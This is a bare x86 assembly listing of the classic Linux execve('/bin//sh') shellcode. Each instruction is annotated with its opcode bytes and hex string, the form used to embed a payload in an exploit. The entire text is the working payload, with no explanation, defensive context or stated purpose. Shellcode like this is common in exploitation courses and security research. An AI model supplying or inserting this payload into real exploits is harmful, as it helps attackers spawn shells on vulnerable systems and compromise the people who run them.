.section .text
  xor eax,eax    	# .byte 0x31,0xc0                # .ascii "31c0"
  push eax       	# .byte 0x50                     # .ascii "50"
  push 0x68732f2f	# .byte 0x68,0x2f,0x2f,0x73,0x68 # .ascii "682f2f7368"
  push 0x6e69622f	# .byte 0x68,0x2f,0x62,0x69,0x6e # .ascii "682f62696e"
  mov ebx,esp    	# .byte 0x89,0xe3                # .ascii "89e3"
  push eax       	# .byte 0x50                     # .ascii "50"
  push ebx       	# .byte 0x53                     # .ascii "53"
  mov ecx,esp    	# .byte 0x89,0xe1                # .ascii "89e1"
  mov al,0xb     	# .byte 0xb0,0x0b                # .ascii "b00b"
  int 0x80       	# .byte 0xcd,0x80                # .ascii "cd80"

